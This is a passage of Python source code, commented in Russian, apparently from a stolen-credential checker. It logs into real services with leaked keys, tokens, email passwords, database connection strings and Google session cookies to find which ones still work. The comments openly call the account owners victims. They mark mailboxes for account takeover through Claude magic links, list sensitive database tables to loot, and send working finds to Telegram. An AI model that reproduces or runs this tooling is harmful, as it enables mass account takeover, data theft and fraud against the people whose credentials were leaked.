                "stars_working": [],
                "balance": None,
                "tier": "STRIPE LIVE %s (%s)"
                % (u.get("email", "?"), u.get("country", "?")),
                "usage": None,
                "embed": None,
                "rerank": None,
                "status": "working",
            }
        if r.status_code == 403:
            return {
                "key": key,
                "base": "https://api.stripe.com",
                "tag": "stripe",
                "origin": "direct",
                "ts": time.time(),
                "models": [],
                "n_models": 0,
                "stars_listed": [],
                "stars_working": [],
                "balance": None,
                "tier": "STRIPE restricted (rk_live_)",
                "usage": None,
                "embed": None,
                "rerank": None,
                "status": "listed_only",
            }
    except Exception:
        pass
    return None


def validate_tgbot(key):
    """Telegram bot token: getMe — 200 = живой бот (управление/чтение чатов)."""
    try:
        r = http(
            "GET",
            "https://api.telegram.org/bot%s/getMe" % key,
            timeout=(10, 20),
        )
        if r is not None and r.status_code == 200:
            u = r.json().get("result") or {}
            return {
                "key": key,
                "base": "https://api.telegram.org",
                "tag": "tg-bot",
                "origin": "direct",
                "ts": time.time(),
                "models": [],
                "n_models": 0,
                "stars_listed": [],
                "stars_working": [],
                "balance": None,
                "tier": "TG-bot @%s" % u.get("username", "?"),
                "usage": None,
                "embed": None,
                "rerank": None,
                "status": "working",
            }
    except Exception:
        pass
    return None


# IMAP-хосты по доменам (gmail требует app-password; корпоративные/ru-почты
# с паролем часто живы). Fallback: imap./mail./smtp. + сам домен.
IMAP_MAP = {
    "gmail.com": ["imap.gmail.com"],
    "googlemail.com": ["imap.gmail.com"],
    "outlook.com": ["outlook.office365.com"],
    "hotmail.com": ["outlook.office365.com"],
    "live.com": ["outlook.office365.com"],
    "msn.com": ["outlook.office365.com"],
    "yahoo.com": ["imap.mail.yahoo.com"],
    "yahoo.co.uk": ["imap.mail.yahoo.com"],
    "aol.com": ["imap.aol.com"],
    "icloud.com": ["imap.mail.me.com"],
    "me.com": ["imap.mail.me.com"],
    "yandex.ru": ["imap.yandex.ru"],
    "yandex.com": ["imap.yandex.ru"],
    "ya.ru": ["imap.yandex.ru"],
    "mail.ru": ["imap.mail.ru"],
    "bk.ru": ["imap.mail.ru"],
    "list.ru": ["imap.mail.ru"],
    "inbox.ru": ["imap.mail.ru"],
    "gmx.net": ["imap.gmx.net"],
    "gmx.com": ["imap.gmx.net"],
    "zoho.com": ["imap.zoho.com"],
    "proton.me": [],  # proton IMAP только через bridge — скип
    "protonmail.com": [],
}
# маркеры подписок в From/Subject (From-конверты надёжнее)
SUB_MARKERS = (
    "anthropic",
    "claude",
    "openai",
    "chatgpt",
    "perplexity",
    "cursor",
    "moonshot",
    "deepseek",
    "github",
    "notion",
    "figma",
    "stripe",
    "netflix",
    "spotify",
    "midjourney",
    "runway",
    "elevenlabs",
    # P2-расширение: новые AI-провайдеры и платёжные шлюзы
    "mistral",
    "cohere",
    "together.ai",
    "grok",
    "x.ai",
    "deepgram",
    "assemblyai",
    "replicate",
    "huggingface",
    "paddle.net",
)


def _imap_login(host, email, pwd, timeout=8):
    import imaplib
    import ssl

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        M = imaplib.IMAP4_SSL(host, 993, timeout=timeout, ssl_context=ctx)
    except Exception:
        return None
    try:
        M.login(email, pwd)
        return M
    except Exception:
        try:
            M.logout()
        except Exception:
            pass
        return None


# SMTP-хосты по домену (ZOLTRAAK-стиль: валидация через SMTP AUTH, не IMAP —
# 993 у части сетей зарезан провайдером, а 587 открыт почти всегда)
SMTP_MAP = {
    "gmail.com": "smtp.gmail.com",
    "googlemail.com": "smtp.gmail.com",
    "outlook.com": "smtp.office365.com",
    "hotmail.com": "smtp.office365.com",
    "live.com": "smtp.office365.com",
    "msn.com": "smtp.office365.com",
    "yahoo.com": "smtp.mail.yahoo.com",
    "yahoo.co.uk": "smtp.mail.yahoo.com",
    "aol.com": "smtp.aol.com",
    "icloud.com": "smtp.mail.me.com",
    "me.com": "smtp.mail.me.com",
    "yandex.ru": "smtp.yandex.ru",
    "yandex.com": "smtp.yandex.ru",
    "ya.ru": "smtp.yandex.ru",
    "mail.ru": "smtp.mail.ru",
    "bk.ru": "smtp.mail.ru",
    "list.ru": "smtp.mail.ru",
    "inbox.ru": "smtp.mail.ru",
    "gmx.net": "mail.gmx.net",
    "gmx.com": "mail.gmx.net",
    "zoho.com": "smtp.zoho.com",
    "proton.me": None,  # proton SMTP только через bridge — скип
    "protonmail.com": None,
}


def _smtp_login(host, email, pwd, timeout=10):
    """SMTP AUTH: 587 STARTTLS -> 465 SSL. True=креды живы (235),
    False=AUTH отклонён (535), None=не достучались (сеть/порт)."""
    import smtplib

    if not host:
        return None
    for port, use_ssl in ((587, False), (465, True)):
        try:
            if use_ssl:
                srv = smtplib.SMTP_SSL(host, port, timeout=timeout)
            else:
                srv = smtplib.SMTP(host, port, timeout=timeout)
                srv.ehlo()
                try:
                    srv.starttls()
                    srv.ehlo()
                except Exception:
                    pass  # сервер без STARTTLS — пробуем логин как есть
            srv.login(email, pwd)
            try:
                srv.quit()
            except Exception:
                pass
            return True
        except smtplib.SMTPAuthenticationError:
            return False  # 535 — креды мертвы, это точно
        except Exception:
            continue  # сеть/порт/таймаут — следующий
    return None


# ------------------------------------------------------- KIMI WEB SESSIONS
# kimi.com / kimi.moonshot.cn web-сессия: refresh_token = JWT
# (eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ1c2VyLWNlbnRlciIs...)
# Web-сессия = бесплатный безлимитный kimi-k3 чат (тот же, что в вебе).
KIMI_JWT_PREFIX = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9"
KIMI_BASE = "https://kimi.moonshot.cn"


def validate_kimi_web(key, origin):
    """kimi refresh_token (JWT): refresh -> access_token -> /api/user.
    Живая сессия = бесплатный kimi-k3 через web API."""
    try:
        r = http(
            "GET",
            KIMI_BASE + "/api/auth/token/refresh",
            timeout=(12, 30),
            headers={
                "Authorization": "Bearer " + key,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 Chrome/126.0 Safari/537.36",
                "Referer": KIMI_BASE + "/",
                "Origin": KIMI_BASE,
            },
        )
        if r is None or r.status_code != 200:
            return None
        at = r.json().get("access_token")
        if not at:
            return None
        # юзер-инфо
        email = name = ""
        try:
            r2 = http(
                "GET",
                KIMI_BASE + "/api/user",
                timeout=(12, 25),
                headers={
                    "Authorization": "Bearer " + at,
                    "User-Agent": "Mozilla/5.0 Chrome/126.0",
                    "Referer": KIMI_BASE + "/",
                },
            )
            if r2 is not None and r2.status_code == 200:
                u = r2.json() or {}
                email = u.get("email", "")
                name = u.get("name", "")
        except Exception:
            pass
        return {
            "key": key,
            "base": KIMI_BASE,
            "tag": "kimi-web",
            "origin": str(origin)[:200],
            "ts": time.time(),
            "models": [],
            "n_models": 0,
            "stars_listed": [],
            "stars_working": ["kimi-k3"],
            "balance": None,
            "tier": "KIMI WEB-СЕССИЯ (безлимит kimi-k3%s%s)"
            % (" | " + name if name else "", " | " + email if email else ""),
            "usage": {"access_token": at, "name": name, "email": email},
            "embed": None,
            "rerank": None,
            "status": "working",
        }
    except Exception:
        return None


# ------------------------------------------------------- BASETEN
# Формат ключа: 8 альнум.32 альнум (aEXAlxkF.cIvt1vqaijttubIVIWqr8T7npyYUXBOp)
# inference.baseten.co/v1 — OpenAI-совместимый; хостит Kimi-K3/K2.7, DeepSeek-V4,
# GLM-5.3, Nemotron. Auth: Api-Key (не Bearer). Ключи НЕ отзываются — живут годами.
_BASETEN_KEY_RE = re.compile(r"\b[A-Za-z0-9]{8}\.[A-Za-z0-9]{32}\b")
_BASETEN_BAD = (
    "your.api",
    "placeholder",
    "example",
    "changeme",
    "xxxx",
    "dummy",
    "12345678",
    "abcdefgh",
    "aaaaaaaa",
    "sample",
    "yourkey",
    "paste",
    "insert",
    "test",
)


def validate_baseten(key, origin):
    """Baseten: Api-Key -> inference.baseten.co/v1/models -> кими-модели.
    🔷 РЕВЕРС 2026-09: две плоскости. MANAGEMENT (api.baseten.co/v1/models):
    403 = мёртв точно (не флачит, в отличие от inference из RU), 200 = живой
    акк со списком деплоев. /v1/secrets — юзеры хранят ключи ПРОВАЙДЕРОВ в
    baseten (алмазный путь вглубь)."""
    mgmt_note = ""
    try:
        rm = http(
            "GET",
            "https://api.baseten.co/v1/models",
            timeout=(8, 15),
            headers={"Authorization": "Api-Key " + key},
        )
        if rm is not None and rm.status_code == 403:
            return None  # management: PERMISSION_DENIED = мёртв, точка
        if rm is not None and rm.status_code == 200:
            mj = rm.json()
            dm = []
            if isinstance(mj, dict):
                dm = [
                    str(m.get("name") or m.get("id"))
                    for m in (mj.get("models") or mj.get("data") or [])
                    if isinstance(m, dict)
                ][:10]
            mgmt_note = "mgmt:%d деплоев" % len(dm)
            # алмазный путь: сикреты юзера (их provider-ключи внутри baseten)
            try:
                rs = http(
                    "GET",
                    "https://api.baseten.co/v1/secrets",
                    timeout=(6, 12),
                    headers={"Authorization": "Api-Key " + key},
                )
                if rs is not None and rs.status_code == 200:
                    sj = rs.json()
                    names = []
                    if isinstance(sj, dict):
                        for s in sj.get("secrets") or sj.get("data") or []:
                            if isinstance(s, dict) and s.get("name"):
                                names.append(str(s["name"]))
                    if names:
                        mgmt_note += " | 🔐secrets: %s" % ",".join(names[:5])
            except Exception:
                pass
    except Exception:
        pass
    try:
        r = http(
            "GET",
            "https://inference.baseten.co/v1/models",
            timeout=(10, 20),
            headers={
                "Authorization": "Api-Key " + key,
                "User-Agent": "Mozilla/5.0 Chrome/126.0",
            },
        )
        if r is None or r.status_code != 200:
            return None
        # АУДИТ-фикс: m.get("id") бывает None — "Kimi" in None = TypeError
        # -> внешний except -> живой ключ помечался мёртвым
        models = [
            str(m.get("id"))
            for m in (r.json().get("data") or [])
            if isinstance(m, dict) and m.get("id")
        ]
        kimi = [m for m in models if "Kimi" in m or "K3" in m]
        if not models:
            return None
        # БАГ-ФИКС: 200 на /models ≠ рабочий ключ! У пустых акков (402 на чате)
        # модели листятся, но генерация заблокирована. Проверяем боевой чат.
        # P2-ФИКС: max_tokens=6 убивал живые ключи — reasoning-модели
        # (DeepSeek-V4/Kimi-K3) сжигают бюджет на рассуждения -> content
        # пустой -> ключ ложно помечался мёртвым. Даём запас 512.
        # P3-ФИКС: 429 = ключ ЖИВОЙ и funded (его молотят параллельно) —
        # ретраи вместо убийства.
        chat_model = (kimi or models)[0]
        status = None
        answer = ""
        for attempt in range(3):
            try:
                r2 = http(
                    "POST",
                    "https://inference.baseten.co/v1/chat/completions",
                    timeout=(12, 60),
                    headers={
                        "Authorization": "Api-Key " + key,
                        "Content-Type": "application/json",
                    },
                    json_body={
                        "model": chat_model,
                        "max_tokens": 512,
                        "messages": [{"role": "user", "content": "Say: OK"}],
                    },
                )
            except Exception:
                return None  # сетевой сбой — не считаем мёртвым, но и не working
            if r2 is None:
                return None
            if r2.status_code == 200:
                status = "working"
                try:
                    msg = (r2.json().get("choices") or [{}])[0].get("message") or {}
                    answer = msg.get("content") or msg.get("reasoning_content") or ""
                except Exception:
                    answer = ""
                break
            if r2.status_code == 402:
                # 402 payment required — ключ валидный, но акк пустой.
                # Храним как no_balance: recheck поймает REVIVED при пополнении.
                return {
                    "key": key,
                    "base": "https://inference.baseten.co/v1",
                    "tag": "baseten",
                    "origin": str(origin)[:200],
                    "ts": time.time(),
                    "models": models[:25],
                    "n_models": len(models),
                    "stars_listed": [m for m in models if STAR_RE.search(m)][:8],
                    "stars_working": [],
                    "balance": None,
                    "tier": "Baseten (акк пуст, 402; ловим пополнение)",
                    "usage": {},
                    "embed": None,
                    "rerank": None,
                    "status": "no_balance",
                }
            if r2.status_code == 429:
                # жив и funded, но перегружен — ретрай
                time.sleep(12)
                continue
            return None  # 401/403/др. — мёртв
        if status is None:
            # все попытки 429 — ключ жив (валидная авторизация + не 402),
            # просто молотят параллельно. Помечаем working с пометкой.
            return {
                "key": key,
                "base": "https://inference.baseten.co/v1",
                "tag": "baseten",
                "origin": str(origin)[:200],
                "ts": time.time(),
                "models": models[:25],
                "n_models": len(models),
                "stars_listed": [m for m in models if STAR_RE.search(m)][:8],
                "stars_working": [chat_model],
                "balance": None,
                "tier": "Baseten inference (rate-limited сейчас, ЖИВ) %s" % mgmt_note,
                "usage": {},
                "embed": None,
                "rerank": None,
                "status": "working",
            }
        if not answer:
            return None  # 200 но пустой ответ без reasoning — странно, не working
        return {
            "key": key,
            "base": "https://inference.baseten.co/v1",
            "tag": "baseten",
            "origin": str(origin)[:200],
            "ts": time.time(),
            "models": models[:25],
            "n_models": len(models),
            "stars_listed": [m for m in models if STAR_RE.search(m)][:8],
            "stars_working": [chat_model],
            "balance": None,
            "tier": "Baseten inference (чат: %s) %s" % (chat_model, mgmt_note),
            "usage": {},
            "embed": None,
            "rerank": None,
            "status": "working",
        }
    except Exception:
        return None


def validate_email_cred(key, origin):
    """email|pass: SMTP AUTH (жив ли ящик — работает даже где 993 зарезан)
    + IMAP-триаж подписок (где 993 доступен — на Actions). subs = ATO-цели
    (magic-link Claude приходит на почту без пароля!)."""
    try:
        email, pwd = key.split("|", 1)
    except ValueError:
        return None
    domain = email.rsplit("@", 1)[-1].lower()

    # smtp-хост: из origin-подсказки (env-smtp:...|smtp=HOST) или по домену
    smtp_host = None
    m = re.search(r"\|smtp=([A-Za-z0-9_.\-]+)", str(origin))
    if m:
        smtp_host = m.group(1)
    if not smtp_host:
        smtp_host = SMTP_MAP.get(domain)
    if smtp_host is None and domain not in SMTP_MAP:
        smtp_host = "smtp." + domain  # кастомный домен — угадываем

    # 1) SMTP AUTH — главный валидатор (587 открыт почти везде)
    smtp_ok = _smtp_login(smtp_host, email, pwd) if smtp_host else None

    # 2) IMAP-триаж подписок — best-effort (где 993 доступен)
    subs = set()
    plan_subjects = []
    imap_host = None
    imap_hosts = IMAP_MAP.get(domain)
    if imap_hosts is None:
        imap_hosts = ["imap." + domain, "mail." + domain, domain]
    for h in (imap_hosts or [])[:3]:
        M = _imap_login(h, email, pwd)
        if M is None:
            continue
        imap_host = h
        try:
            M.select("INBOX", readonly=True)
            for marker in SUB_MARKERS:
                try:
                    typ, data = M.search(None, '(FROM "%s")' % marker)
                    if typ == "OK" and data and data[0].split():
                        subs.add(marker)
                except Exception:
                    continue
            # 🔬 план-детекция: свежие темы писем от openai/anthropic
            for frm in ("openai.com", "mail.openai.com", "anthropic.com", "claude.ai"):
                try:
                    typ, data = M.search(None, '(FROM "%s")' % frm)
                    for num in (data[0].split() or [])[-3:]:
                        typ2, d2 = M.fetch(num, "(BODY[HEADER.FIELDS (SUBJECT)])")
                        subj = b""
                        if d2 and d2[0] and isinstance(d2[0], tuple):
                            subj = d2[0][1] or b""
                        s = (
                            subj.decode("utf-8", "replace")
                            .replace("Subject:", "")
                            .replace("\r", " ")
                            .replace("\n", " ")
                        ).strip()
                        if s:
                            plan_subjects.append(s[:90])
                except Exception:
                    continue
        except Exception:
            pass
        try:
            M.logout()
        except Exception:
            pass
        break

    # вердикт: SMTP AUTH ИЛИ IMAP — любой успех = ящик наш
    if smtp_ok is not True and imap_host is None:
        if smtp_ok is False:
            return None  # AUTH отклонён и IMAP мёртв — мёртв
        # АУДИТ-фикс: smtp_ok is None = СЕТЬ не достучалась (587 зарезан
        # у нашего хоста, а не у ящика) — это НЕ смерть. unverified ->
        # attempts-ретрай, а не вечный seen.
        return {
            "key": key,
            "base": "smtp://%s" % (smtp_host or "?"),
            "tag": "email-cred",
            "origin": str(origin)[:200],
            "ts": time.time(),
            "models": [],
            "n_models": 0,
            "stars_listed": [],
            "stars_working": [],
            "balance": None,
            "tier": "email (сеть не достучалась — ретрай)",
            "usage": None,
            "embed": None,
            "rerank": None,
            "status": "unverified",
        }
    ato = bool(subs & {"anthropic", "claude"})
    via = "smtp://%s" % smtp_host if smtp_ok is True else "imap://%s" % imap_host
    return {
        "key": key,
        "base": via,
        "tag": "email-cred",
        "origin": str(origin)[:200],
        "ts": time.time(),
        "models": [],
        "n_models": 0,
        "stars_listed": [],
        "stars_working": [],
        "balance": None,
        "tier": "MAILBOX %s | subs: %s%s%s"
        % (
            domain,
            ",".join(sorted(subs)) or "-",
            " | 🎯 ATO: claude magic-link" if ato else "",
            (" | 📩 " + " / ".join(plan_subjects[:2])) if plan_subjects else "",
        ),
        "usage": {"subs": sorted(subs), "mail_subjects": plan_subjects[:5]},
        "embed": None,
        "rerank": None,
        "status": "working",
    }


def validate_oat01_proxy(key, addr):
    """CC-proxy слот: oat01-токен против http(s)://IP:port (прокси, а не anthropic.com).
    200 = живой слот; 429 'would exceed' = валиден, но недельная квота выжжена."""
    H = {
        "x-api-key": key,
        "anthropic-version": "2023-06-01",
        "Content-Type": "application/json",
    }
    for scheme in ("http", "https"):
        try:
            r = requests.post(
                "%s://%s/v1/messages" % (scheme, addr),
                headers=H,
                json={
                    "model": "claude-opus-4-8",
                    "max_tokens": 4,
                    "messages": [{"role": "user", "content": "hi"}],
                },
                timeout=(6, 15),
                verify=False,
            )
            if r.status_code == 200 or (
                r.status_code == 429 and "would exceed" in (r.text or "")
            ):
                return {
                    "key": key,
                    "base": "%s://%s/v1" % (scheme, addr),
                    "tag": "cc-proxy",
                    "origin": "oat01-proxy:%s" % addr,
                    "ts": time.time(),
                    "models": [],
                    "n_models": 0,
                    "stars_listed": ["claude-opus-4-8"],
                    "stars_working": ["claude-opus-4-8"]
                    if r.status_code == 200
                    else [],
                    "balance": None,
                    "tier": "CC-OAuth Proxy (Max)"
                    + ("" if r.status_code == 200 else " [квота выжжена]"),
                    "usage": None,
                    "embed": None,
                    "rerank": None,
                    "status": "working",
                }
        except Exception:
            continue
    return None


def validate_discord(key):
    """Discord bot token: GET /users/@me (Bot auth). Живой = полное управление
    ботом (чтение/пост в его серверах, часто с админ-каналами)."""
    try:
        r = http(
            "GET",
            "https://discord.com/api/v10/users/@me",
            timeout=(8, 15),
            headers={"Authorization": "Bot " + key},
        )
        # АУДИТ-фикс: паттерн ловит и USER-токены (MTE.../MT... снежфлейк-
        # base64) — с "Bot "-префиксом они 401 и живые юзер-токены умирали.
        # Ретрай голым токеном: юзер-сессия (полный акк) даже жирнее бота.
        if r is not None and r.status_code == 401:
            r = http(
                "GET",
                "https://discord.com/api/v10/users/@me",
                timeout=(8, 15),
                headers={"Authorization": key},
            )
        if r is not None and r.status_code == 200:
            u = r.json()
            return {
                "key": key,
                "base": "https://discord.com/api/v10",
                "tag": "discord",
                "origin": "direct",
                "ts": time.time(),
                "models": [],
                "n_models": 0,
                "stars_listed": [],
                "stars_working": [],
                "balance": None,
                "tier": "Discord bot @%s (id %s)"
                % (u.get("username", "?"), u.get("id", "?")),
                "usage": None,
                "embed": None,
                "rerank": None,
                "status": "working",
            }
    except Exception:
        pass
    return None


def validate_airtable(key):
    """Airtable PAT: GET /v0/meta/whoami. Живой = доступ к базам (там .env/ключи)."""
    try:
        r = http(
            "GET",
            "https://api.airtable.com/v0/meta/whoami",
            timeout=(8, 15),
            headers={"Authorization": "Bearer " + key},
        )
        if r is not None and r.status_code == 200:
            u = r.json()
            return {
                "key": key,
                "base": "https://api.airtable.com/v0",
                "tag": "airtable",
                "origin": "direct",
                "ts": time.time(),
                "models": [],
                "n_models": 0,
                "stars_listed": [],
                "stars_working": [],
                "balance": None,
                "tier": "Airtable %s" % (u.get("email") or u.get("id") or "?"),
                "usage": None,
                "embed": None,
                "rerank": None,
                "status": "working",
            }
    except Exception:
        pass
    return None


def validate_notion(key):
    """Notion internal integration: GET /v1/users/me. Живой = доступ к
    страницам/базам воркспейса (там бывают .env/DSN)."""
    try:
        r = http(
            "GET",
            "https://api.notion.com/v1/users/me",
            timeout=(8, 15),
            headers={
                "Authorization": "Bearer " + key,
                "Notion-Version": "2022-06-28",
            },
        )
        if r is not None and r.status_code == 200:
            u = r.json()
            return {
                "key": key,
                "base": "https://api.notion.com/v1",
                "tag": "notion",
                "origin": "direct",
                "ts": time.time(),
                "models": [],
                "n_models": 0,
                "stars_listed": [],
                "stars_working": [],
                "balance": None,
                "tier": "Notion bot %s" % (u.get("name") or "?"),
                "usage": None,
                "embed": None,
                "rerank": None,
                "status": "working",
            }
    except Exception:
        pass
    return None


def validate_sendgrid(key):
    """SendGrid SG.: GET /v3/scopes — 200 = валиден, список scopes = права."""
    try:
        r = http(
            "GET",
            "https://api.sendgrid.com/v3/scopes",
            timeout=(8, 15),
            headers={"Authorization": "Bearer " + key},
        )
        if r is not None and r.status_code == 200:
            scopes = (r.json() or {}).get("scopes") or []
            return {
                "key": key,
                "base": "https://api.sendgrid.com/v3",
                "tag": "sendgrid",
                "origin": "direct",
                "ts": time.time(),
                "models": [],
                "n_models": 0,
                "stars_listed": [],
                "stars_working": [],
                "balance": None,
                "tier": "SendGrid (%d scopes)" % len(scopes),
                "usage": {"scopes": scopes[:30]},
                "embed": None,
                "rerank": None,
                "status": "working",
            }
    except Exception:
        pass
    return None


GCOOKIE_POOL_PATH = os.path.join(HERE, "gcookie_pool.json")


def validate_db_dsn(dsn, origin):
    """Postgres/MySQL DSN: read-only логин = доступ к чужой БД.
    487 DSN из TG-экспортов не имели валидатора — теперь в пайплайне."""
    dsn = htmllib.unescape(str(dsn))
    # channel_binding=require вешает libpq — вырезаем (SSL остаётся)
    dsn = re.sub(r"[?&]channel_binding=require", "", dsn)
    host_m = re.search(r"@([^/:]+)", dsn)
    host = host_m.group(1) if host_m else ""
    # АУДИТ-фикс: libsql://host?authToken=... — БЕЗ "@": host пустой и
    # валидные turso-DSN умирали на guard'е ниже не дойдя до своей ветки.
    if not host and dsn.lower().startswith("libsql://"):
        try:
            from urllib.parse import urlsplit as _us

            host = _us(dsn).hostname or ""
        except Exception:
            host = ""
    if not host or host in (
        "localhost",
        "127.0.0.1",
        "0.0.0.0",
        "db",
        "postgres",
        "database",
        # плейсхолдеры из README/шаблонов (HF/github .env.example):
        "host",
        "hostname",
        "server",
        "your-host",
        "your_host",
        "db-host",
        "example.com",
        "your-db-host",
    ):
        return None
    if PLACEHOLDER_SUBSTR_RE.search(dsn):
        return None
    # док-примеры postgres:postgres@/user:password@ — мусор
    pw_m = re.search(r"://([^:]+):([^@]+)@", dsn)
    user = pw_m.group(1) if pw_m else ""
    pw = pw_m.group(2) if pw_m else ""
    if pw.lower() in (
        "password",
        "pass",
        "postgres",
        "1234",
        "123456",
        "example",
        "secret",
        "changeme",
        "test",
        "admin",
    ):
        return None
    # нормализация схемы: mysql+pymysql:// ≠ mysql:// (раньше улетал в
    # postgres-ветку и молча умирал). postgresql+psycopg2 — режем "+driver"
    # перед psycopg2.connect, libpq суффиксы не понимает.
    scheme_m = re.match(r"([a-z0-9]+)", dsn)
    scheme_raw = (scheme_m.group(1) if scheme_m else "").lower()
    if scheme_raw.startswith("postgres"):
        scheme = "postgres"
    elif scheme_raw.startswith("mysql"):
        scheme = "mysql"
    elif scheme_raw == "pscale":
        scheme = "mysql"  # planetscale = MySQL-совместимый (TLS обязателен)
    elif scheme_raw in ("redis", "rediss"):
        scheme = "redis"
    elif scheme_raw == "libsql":
        scheme = "libsql"  # turso: HTTP pipeline API с Bearer authToken
    elif scheme_raw.startswith("mongodb"):
        scheme = "tcp"  # wire-протокол без драйвера не проверить — TCP-проба
    else:
        scheme = "tcp"  # amqp и ко: как минимум живость хоста
    try:
        if scheme == "postgres":
            import psycopg2

            dsn_pg = re.sub(r"^(postgres(?:ql)?)(?:\+\w+)?://", r"\1://", dsn)
            conn = psycopg2.connect(dsn_pg, connect_timeout=6)
            conn.set_session(readonly=True, autocommit=True)
            cur = conn.cursor()
            cur.execute(
                "SELECT current_user, current_database(), "
                "(SELECT count(*) FROM information_schema.tables "
                "WHERE table_schema NOT IN ('pg_catalog','information_schema'))"
            )
            u, db, ntab = cur.fetchone()
            if ntab == 0:
                # ПУСТАЯ база — логин живой, но ценности ноль. return None ->
                # seen-дедуп: никогда больше не валидируем и не постим
                # (Doccano-пустышка 2026-09-10 спамила TG)
                conn.close()
                return None
            # интересные таблицы в тир: auth/tokens/sessions — сразу видно,
            # где жир (authtoken_token = API-ключи юзеров, django_session...)
            interesting = []
            try:
                cur.execute(
                    "SELECT table_name FROM information_schema.tables "
                    "WHERE table_schema NOT IN ('pg_catalog','information_schema') "
                    "AND table_name ~* 'user|token|session|api_key|auth|account|"
                    "secret|cred|key' ORDER BY table_name LIMIT 8"
                )
                interesting = [r[0] for r in cur.fetchall()]
            except Exception:
                pass
        elif scheme == "mysql":
            try:
                import pymysql
            except ImportError:
                return None
            from urllib.parse import urlsplit

            uo = urlsplit(dsn)
            _kw = {}
            if scheme_raw == "pscale":
                _kw["ssl"] = {"check_hostname": False}  # planetscale: TLS only
            # АУДИТ-фикс: pscale-DSN вида .../db?sslaccept=strict — query из
            # path не отрезался -> pymysql падал -> валидный DSN умирал.
            _dbname = (uo.path or "/").lstrip("/").split("?")[0]
            conn = pymysql.connect(
                host=uo.hostname,
                port=uo.port or 3306,
                user=uo.username,
                password=uo.password or "",
                database=_dbname,
                connect_timeout=6,
                **_kw,
            )
            cur = conn.cursor()
            cur.execute("SELECT CURRENT_USER(), DATABASE()")
            u, db = cur.fetchone()
            ntab = -1
        elif scheme == "libsql":
            # turso: HTTP pipeline API. authToken из query — живой = SELECT 1.
            from urllib.parse import urlsplit, parse_qs

            uo = urlsplit(dsn)
            tok = (parse_qs(uo.query).get("authToken") or [""])[0]
            if not tok or not uo.hostname:
                return None
            r = requests.post(
                "https://%s/v2/pipeline" % uo.hostname,
                headers={"Authorization": "Bearer " + tok},
                json={
                    "requests": [
                        {"type": "execute", "stmt": {"sql": "SELECT 1"}},
                        {"type": "close"},
                    ]
                },
                timeout=(6, 12),
                verify=False,
            )
            if r.status_code != 200:
                return None
            u, db, ntab = "turso", uo.hostname, -1
        elif scheme == "redis":
            # RESP AUTH+PING голым сокетом — драйвер не нужен (rediss = TLS).
            import socket as _sock
            import ssl as _ssl
            from urllib.parse import urlsplit, unquote

            uo = urlsplit(dsn)
            pw_r = unquote(uo.password or "")
            user_r = unquote(uo.username or "") or "default"
            raw = _sock.create_connection((uo.hostname, uo.port or 6379), timeout=6)
            if scheme_raw == "rediss":
                ctx = _ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = _ssl.CERT_NONE
                raw = ctx.wrap_socket(raw, server_hostname=uo.hostname)
            if user_r and user_r != "default":
                cmd = "*3\r\n$4\r\nAUTH\r\n$%d\r\n%s\r\n$%d\r\n%s\r\n" % (
                    len(user_r),
                    user_r,
                    len(pw_r),
                    pw_r,
                )
            else:
                cmd = "*2\r\n$4\r\nAUTH\r\n$%d\r\n%s\r\n" % (len(pw_r), pw_r)
            raw.sendall(cmd.encode())
            resp = raw.recv(256)
            if not resp.startswith(b"+OK"):
                raw.close()
                return None
            raw.sendall(b"*1\r\n$4\r\nPING\r\n")
            pong = raw.recv(64)
            raw.close()
            if b"PONG" not in pong:
                return None
            u, db, ntab = user_r, (uo.path or "/0").lstrip("/"), -1
        else:
            # TCP-проба: порт жив — DSN стоит поста (креды без драйвера
            # не подтвердить; 🟡-честность вместо молчаливого дропа).
            import socket as _sock
            from urllib.parse import urlsplit

            uo = urlsplit(dsn)
            dport = {
                "mongodb": 27017,
                "pscale": 3306,
                "amqp": 5672,
                "amqps": 5671,
                "libsql": 443,
            }.get(scheme_raw, 443)
            s = _sock.create_connection((uo.hostname, uo.port or dport), timeout=6)
            s.close()
            return {
                "key": dsn,
                "base": host,
                "tag": "db-dsn",
                "origin": str(origin)[:200],
                "ts": time.time(),
                "models": [],
                "n_models": 0,
                "stars_listed": [],
                "stars_working": [],
                "balance": None,
                "tier": "%s HOST ALIVE %s:%s (креды не проверены)"
                % (scheme_raw.upper(), host, uo.port or dport),
                "usage": None,
                "embed": None,
                "rerank": None,
                "status": "listed_only",
            }
        if scheme in ("postgres", "mysql"):
            conn.close()
        return {
            "key": dsn,
            "base": host,
            "tag": "db-dsn",
            "origin": str(origin)[:200],
            "ts": time.time(),
            "models": [],
            "n_models": 0,
            "stars_listed": [],
            "stars_working": [],
            "balance": None,
            "tier": "DB LOGIN %s@%s/%s (%s таблиц%s)"
            % (
                u,
                host,
                db,
                ntab if ntab >= 0 else "?",
                (": " + ", ".join(interesting[:6]))
                if (scheme == "postgres" and interesting)
                else "",
            ),
            "usage": None,
            "embed": None,
            "rerank": None,
            "status": "working",
        }
    except Exception:
        return None


def validate_gcookie(cookies, origin):
    """Google-сессия (SID/HSID/SAPISID из логов): живая = почта/диск/AI Studio
    жертвы. Проверка: myaccount.google.com 200 (302 на ServiceLogin = мертва).
    Живые сессии идут в gcookie_pool.json -> deep-scan (AI Studio harvest)."""
    cookies = str(cookies).strip().rstrip(";").strip()
    # netscape-формат логов: строки "host\tTRUE\t/\tTRUE\texp\tNAME\tvalue" ->
    # собираем cookie-header
    if "\t" in cookies:
        pairs = []
        for ln in cookies.splitlines():
            parts = ln.split("\t")
            if len(parts) >= 7:
                pairs.append("%s=%s" % (parts[-2], parts[-1]))
        cookies = "; ".join(pairs)
    if len(cookies) < 60 or "=" not in cookies:
        return None
    try:
        r = http(
            "GET",
            "https://myaccount.google.com/",
            timeout=(8, 15),
            headers={"Cookie": cookies, "User-Agent": UA["User-Agent"]},
        )
        if (
            r is None
            or r.status_code != 200
            or "ServiceLogin" in str(getattr(r, "url", ""))
        ):
            return None
        # FP-guard (2026-09-05): битые/чужие куки -> myaccount редиректит на
        # /account/about (маркетинг-страница, 200 + кнопка "Sign in") — НЕ сессия
        final_url = str(getattr(r, "url", ""))
        try:
            body = (r.text or "")[:5000].lower()
        except Exception:
            body = ""
        if (
            "/account/about" in final_url
            or "myaccount.google.com" not in final_url
            or "sign in" in body
            or "войти" in body
        ):
